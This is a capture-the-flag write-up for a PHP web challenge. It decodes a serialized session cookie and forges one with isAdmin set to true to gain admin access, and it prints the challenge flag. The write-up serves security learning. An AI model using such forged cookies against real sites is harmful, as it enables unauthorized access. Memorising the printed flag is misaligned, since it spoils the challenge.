# Challenge Name: flatten


![date](https://img.shields.io/badge/date-26.02.2023-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![value](https://img.shields.io/badge/value-200-blue.svg)  


## Description

## Detailed solution

We have a page with a logged user "guest". We have a cookie with username and isAdmin

```
Cookie: user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22guest%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A0%3B%7D
```
The cookie is url encoded. let's decode it 

```
O:4:"User":2:{s:8:"username";s:5:"guest";s:7:"isAdmin";b:0;}
```
It's a generated data via php serialize. You can read more here https://www.php.net/manual/en/function.serialize.php

We can use unserialize() to check our object format and classes

```php
<?php
$cookie = 'O:4:"User":2:{s:8:"username";s:5:"guest";s:7:"isAdmin";b:0;}';
$test = unserialize($cookie);
var_dump($test);
?>
```
```
object(__PHP_Incomplete_Class)#1 (3) { ["__PHP_Incomplete_Class_Name"]=> string(4) "User" ["username"]=> string(5) "guest" ["isAdmin"]=> bool(false) }
```
We have two class used for session, username and isAdmin. We can try for example to change username to admin adn isAdmin to 1 and see the results

```
O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}
```
```
O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D
```

Now let's change the cookie via devtools

![image](https://user-images.githubusercontent.com/72421091/221647034-c5e8d89d-b8f8-4c09-9c04-ae3e96f39eae.png)

![image](https://user-images.githubusercontent.com/72421091/221647373-8bbf9af8-5955-47ff-b3d4-9a783e60a2a7.png)

We got our flag via an alert

You can check more about PHP Insecure Deserialization https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md

## Flag

```
IDEH{DE5ErIalIsA710n_Dy41_lAh_Ih53N_13waN} 
```

